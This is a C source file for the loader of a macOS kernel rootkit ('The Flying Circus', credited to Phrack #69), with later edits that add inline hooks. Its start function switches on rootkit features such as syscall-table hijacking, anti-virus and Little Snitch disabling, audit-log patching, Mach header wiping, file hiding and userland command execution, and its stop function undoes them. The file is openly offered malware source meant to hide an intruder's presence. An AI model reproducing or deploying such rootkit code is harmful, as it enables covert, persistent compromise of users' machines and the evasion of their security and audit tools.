/*
 *   _____   _                          ___     _      _  _     _              __ _
 *  |_   _| | |_      ___      o O O   | __|   | |    | || |   (_)    _ _     / _` |
 *    | |   | ' \    / -_)    o        | _|    | |     \_, |   | |   | ' \    \__, |
 *   _|_|_  |_||_|   \___|   TS__[O]  _|_|_   _|_|_   _|__/   _|_|_  |_||_|   |___/
 * _|"""""|_|"""""|_|"""""| {======|_| """ |_|"""""|_| """"|_|"""""|_|"""""|_|"""""|
 * "`-0-0-'"`-0-0-'"`-0-0-'./o--000'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'
 *            ___      _
 *    o O O  / __|    (_)      _ _    __     _  _     ___
 *   o      | (__     | |     | '_|  / _|   | +| |   (_-<
 *  TS__[O]  \___|   _|_|_   _|_|_   \__|_   \_,_|   /__/_
 *  {======|_|"""""|_|"""""|_|"""""|_|"""""|_|"""""|_|"""""|
 * ./o--000'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'
 *
 * And now for something completely different...
 *
 * A Mountain Lion rootkit for Phrack #69!
 *
 * Copyright (c) fG!, 2012, 2013 - reverser@put.as - http://reverse.put.as
 * All rights reserved.
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 * 1. Redistributions of source code must retain the above copyright
 * notice, this list of conditions and the following disclaimer.
 * 2. Redistributions in binary form must reproduce the above copyright
 * notice, this list of conditions and the following disclaimer in the
 * documentation and/or other materials provided with the distribution.
 * 3. The name of the author may not be used to endorse or promote products
 * derived from this software without specific prior written permission.
 *
 * THIS SOFTWARE IS PROVIDED BY THE AUTHOR ``AS IS'' AND ANY EXPRESS OR
 * IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES
 * OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED.
 * IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY DIRECT, INDIRECT,
 * INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT
 * NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE,
 * DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY
 * THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT
 * (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF
 * THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 *
 */

#include <sys/types.h>
#include <sys/systm.h>
#include <mach/mach_types.h>
#include <libkern/libkern.h>

#include "configuration.h"
#include "ioctl.h"
#include "kernel_control.h"
#include "my_data_definitions.h"
#include "kernel_info.h"
#include "rename_functions.h"
#include "exec_userland_cmd.h"
#include "kdebug.h"
#include "sysent.h"
#include "disasm_utils.h"
#include "av_monster_II.h"
#include "kdebug.h"
#include "zombies.h"
#include "hide_files.h"
#include "anti_littlesnitch.h"
#include "clean_tracks.h"
#include "audit.h"
#include "Collect_log.h"

// global structures
struct kernel_info g_kernel_info;

kern_return_t the_flying_circus_start(kmod_info_t * ki, void *d);
kern_return_t the_flying_circus_stop(kmod_info_t *ki, void *d);

kern_return_t
the_flying_circus_start(kmod_info_t * ki, void *d)
{
    kern_return_t kr= KERN_SUCCESS;
    
#if DEBUG
    //moony_modify//printf("[DEBUG] Starting the circus  the_flying_circus_start...\n");
#endif
    // read kernel from filesystem and initialize a kernel_info structure
    if(init_kernel_info(&g_kernel_info)) return KERN_FAILURE;
    
    // if zombie mode is activated, all the rootkit features will be activated
    // inside the zombie thread and we just return failure here
#if ZOMBIE_MODE > 0
    // disable logging features to avoid error messages from kext failure to load
    //disable_oskextlog();
    //disable_kextd_syslog();
    // activate the zombie
    //unleash_the_zombie();
    //return KERN_FAILURE;
#endif
    // no zombie mode, so activate everything here
#if KDEBUG_MODE > 0
    patch_kdebug_internal();
#endif
    
#if AVMONSTER_MODE > 0
    unleash_the_monster();
#endif
    // add communication channels - we don't need two at the same time
#if DEVICE_MODE > 0
    install_rootkit_device();
#elif KCONTROL_MODE > 0
    install_kern_control();
#endif

#if EXECCMD_MODE > 0
    execute_user_command();
#endif
    
#if HIJACKSYSENT_MODE == 1
    if (hijack_sysent_table()) return KERN_FAILURE;
#elif HIJACKSYSENT_MODE == 2
    if (hijack_sysent_ptr()) return KERN_FAILURE;
#endif
    
#if ANTILITTLESNICH_MODE == 1
    kill_the_snitch();
#endif
    
#if AUDIT_MODE == 1
    patch_audit_commit();
#endif
    
#if NUKEHEADERS_MODE == 1
    nuke_mach_header();
#endif

#if DEBUG
    //add_file_to_hide("/mach_kernel");
    //add_file_to_hide("/Volumes/");
#endif
    
    
    //@flyic moony_li@trendmicro.com 2015-06-17
    kr |= init_inline_hook();
    kr |= install_inline_hook();
    //set_kernel_panic_hook();//This way for monior panic dump does not work!
    //moony_modify//printf("[DEBUG] the_flying_circus_start done...\n");
    //init_collect_log();
    
    
    
    
    
    return KERN_SUCCESS;
}

/*
 * rootkit stop function only valid in non-zombie mode
 */
kern_return_t
the_flying_circus_stop(kmod_info_t *ki, void *d)
{
    
#if KDEBUG_MODE > 0
    unpatch_kdebug_internal();
#endif
    
#if AVMONSTER_MODE > 0
    leash_the_monster();
#endif

#if DEVICE_MODE > 0
    remove_rootkit_device();
#elif KCONTROL_MODE > 0
    remove_kern_control();
#endif
    
#if HIJACKSYSENT_MODE == 1
    unhijack_sysent_table();
#elif HIJACKSYSENT_MODE == 2
    unhijack_sysent_ptr();
#endif

#if ANTILITTLESNICH_MODE == 1
    revive_the_snitch();
#endif

#if AUDIT_MODE == 1
    unpatch_audit_commit();
#endif
    
    //unset_kernel_panic_hook();//This way for monior panic dump does not work!
    //un_init_collect_log();
    un_install_inline_hook();
    un_init_inline_hook();
    cleanup_kernel_info(&g_kernel_info);
#if DEBUG
    //moony_modify//printf("[DEBUG] The circus is over!\n");
#endif
    return KERN_SUCCESS;
}
